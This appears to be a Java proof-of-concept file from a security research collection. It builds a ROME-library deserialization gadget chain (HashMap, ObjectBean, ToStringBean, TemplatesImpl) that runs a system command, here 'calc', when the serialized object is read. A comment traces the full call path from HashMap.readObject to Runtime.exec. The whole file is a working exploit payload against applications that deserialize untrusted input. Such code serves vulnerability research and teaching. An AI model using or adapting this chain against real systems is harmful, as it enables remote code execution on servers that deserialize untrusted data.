package com.javasec.pocs.rome;
import com.javasec.utils.SerializeUtils;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javax.xml.transform.Templates;
import java.util.HashMap;
/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * toString:137, ToStringBean (com.sun.syndication.feed.impl)
 * toString:116, ToStringBean (com.sun.syndication.feed.impl)
 * beanHashCode:193, EqualsBean (com.sun.syndication.feed.impl)
 * hashCode:110, ObjectBean (com.sun.syndication.feed.impl)
 * hash:338, HashMap (java.util)
 * readObject:1397, HashMap (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:48, SerializeUtils (com.javasec.utils)
 * deserTester:264, SerializeUtils (com.javasec.utils)
 * main:18, HashTableC (com.javasec.pocs.rome)
 */
public class ObjectBeanC {
    public static void main(String[] args) throws Exception {
        Templates template = SerializeUtils.getTemplate("calc");
        ToStringBean toStringBean = new ToStringBean(Templates.class, template);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        HashMap<Object, Object> hashMap = SerializeUtils.makeMap(objectBean, "p");
        SerializeUtils.setFieldValue(objectBean, "_cloneableBean", null);
        SerializeUtils.setFieldValue(objectBean, "_toStringBean", null);
        SerializeUtils.deserTester(hashMap);
    }
}
